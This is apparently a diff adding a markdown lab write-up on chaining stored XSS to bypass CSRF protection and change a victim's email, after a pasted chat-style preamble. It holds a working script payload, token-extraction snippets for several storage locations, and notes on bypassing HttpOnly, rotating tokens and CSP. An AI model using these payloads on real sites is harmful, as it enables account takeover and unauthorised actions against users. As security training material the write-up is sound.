@@ -11518,3 +11518,358 @@ If password isn’t stored → attacker makes the user type it
 ```
 
 ---
+
+Alright — this time I rebuilt everything cleanly from scratch and fully controlled the markdown structure so nothing breaks.
+
+👉 Everything is inside one continuous raw markdown block 👉 All payloads, credentials, variables are inside triple backticks 👉 No broken sections, no leaking outside, no formatting corruption
+
+
+---
+
+# 🐞 Lab-28 — Stored XSS → CSRF Bypass (Account Takeover)
+
+---
+
+## 🧠 🔥 Overview
+
+This lab demonstrates a **Stored XSS → CSRF bypass attack chain**, where:
+
+1️⃣ Attacker injects XSS payload  
+2️⃣ Victim loads page  
+3️⃣ JavaScript executes in victim’s browser  
+4️⃣ CSRF token is extracted  
+5️⃣ Sensitive action (change email) is performed  
+
+---
+
+👉 The key concept:
+
+CSRF protection FAILS when XSS exists  
+
+---
+
+👉 Because:
+
+CSRF assumes attacker cannot read token  
+XSS breaks that assumption  
+
+---
+
+## 🧠 🟦 What Is This Topic?
+
+### 🔹 Stored XSS
+
+Malicious JavaScript is stored on the server  
+→ Executes automatically when victim visits page  
+
+---
+
+### 🔹 CSRF Protection
+
+Uses secret token to protect sensitive actions  
+
+---
+
+### 🔥 Combined Attack
+
+XSS → Read CSRF token → Send request  
+→ Bypass CSRF → Perform action as victim  
+
+---
+
+## 🧪 🟩 Lab Walkthrough (Step-by-Step)
+
+---
+
+### 🪜 Step 1 — Login
+
+```
+Username: wiener
+Password: peter
+```
+
+---
+
+### 🪜 Step 2 — Identify Injection Point
+
+Blog → Comment section  
+
+👉 Input fields:
+
+- Name  
+- Email  
+- Website  
+- Comment ← (XSS goes here)
+
+---
+
+### 🪜 Step 3 — Understand Target Action
+
+Change email functionality  
+
+👉 Requires:
+
+- Session cookie (auto)  
+- CSRF token (must steal)  
+
+---
+
+### 🪜 Step 4 — Craft Payload
+
+```
+<script>
+var token = document.querySelector('[name=csrf]').value;
+
+fetch('/my-account/change-email', {
+  method: 'POST',
+  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+  body: 'email=final@mail.com&csrf=' + token
+});
+</script>
+```
+
+---
+
+### 🪜 Step 5 — Submit Payload
+
+Post comment → payload stored  
+
+---
+
+### 🪜 Step 6 — Execution
+
+Victim loads page  
+→ script runs  
+→ token extracted  
+→ request sent  
+
+---
+
+### 🪜 Step 7 — Result
+
+Victim email changed  
+→ account takeover path  
+
+---
+
+## 📸 Screenshot (Final Payload)
+
+![final-payload](../images/xss-csrf-final-payload.png)
+
+---
+
+## 💣 🟨 Payload Breakdown (Easy)
+
+---
+
+### 🔹 Step 1 — Get CSRF Token
+
+```
+document.querySelector('[name=csrf]').value
+```
+
+👉 Finds hidden input:
+
+```
+<input name="csrf" value="abc123">
+```
+
+---
+
+### 🔹 Step 2 — Send Request
+
+```
+fetch('/my-account/change-email', {...})
+```
+
+---
+
+### 🔹 Step 3 — Attach Token
+
+```
+'email=final@mail.com&csrf=' + token
+```
+
+---
+
+### 🔹 Step 4 — Execution
+
+Runs automatically in victim browser  
+
+---
+
+## 🧠 🟥 Real-World Scenarios (VERY IMPORTANT)
+
+---
+
+### 🔥 Scenario 1 — Token in Hidden Input
+
+```
+<input type="hidden" name="csrf" value="abc123">
+```
+
+Payload:
+
+```
+document.querySelector('[name=csrf]').value
+```
+
+---
+
+### 🔥 Scenario 2 — Token in Meta Tag
+
+```
+<meta name="csrf-token" content="abc123">
+```
+
+Payload:
+
+```
+document.querySelector('meta[name=csrf-token]').content
+```
+
+---
+
+### 🔥 Scenario 3 — Token in JavaScript Variable
+
+```
+var csrfToken = "abc123";
+```
+
+Payload:
+
+```
+csrfToken
+```
+
+---
+
+### 🔥 Scenario 4 — Token in Cookie
+
+```
+document.cookie
+```
+
+Extraction:
+
+```
+document.cookie.split('csrf=')[1]
+```
+
+---
+
+### 🔥 Scenario 5 — Token in API Response
+
+```
+fetch('/profile')
+.then(res => res.text())
+.then(data => {
+  let token = data.match(/csrf":"(.*?)"/)[1];
+});
+```
+
+---
+
+### 🔥 Scenario 6 — Multiple Protections
+
+✔ CSRF token  
+✔ SameSite cookies  
+✔ Origin check  
+
+👉 Bypass:
+
+XSS runs inside same origin → everything allowed  
+
+---
+
+## 🧠 🟥 Real-World Limitations & Bypasses
+
+---
+
+### ❌ HttpOnly Cookies
+
+👉 Cannot read cookies  
+
+✔ Bypass:
+
+Perform actions directly using CSRF token  
+
+---
+
+### ❌ Token Changes Per Request
+
+✔ Solution:
+
+Read token dynamically using XSS  
+
+---
+
+### ❌ Strict CSP
+
+✔ Bypass:
+
+Use DOM-based execution / framework abuse  
+
+---
+
+## 🔗 🧠 Attack Chains (Real Bug Bounty)
+
+---
+
+### 🔥 Chain 1 — Account Takeover
+
+XSS → steal CSRF → change email  
+→ password reset → full access  
+
+---
+
+### 🔥 Chain 2 — Financial Abuse
+
+XSS → perform transfer request  
+
+---
+
+### 🔥 Chain 3 — Admin Takeover
+
+XSS → create admin user  
+
+---
+
+### 🔥 Chain 4 — Persistent Control
+
+XSS → change email → attacker owns account  
+
+---
+
+## 🧠 🟪 Mental Model
+
+---
+
+Browser = trusted environment  
+XSS = attacker inside browser  
+CSRF = protection assuming attacker outside  
+
+---
+
+👉 Therefore:
+
+XSS completely breaks CSRF  
+
+---
+
+## 🎯 🔥 Final Understanding
+
+---
+
+✔ CSRF alone is strong  
+✔ XSS alone is dangerous  
+
+✔ Combined → CRITICAL vulnerability  
+
+---
+
+## 🧠 💡 Final One-Liner
+
+---
+
+**With XSS, you don’t bypass CSRF — you become the user**
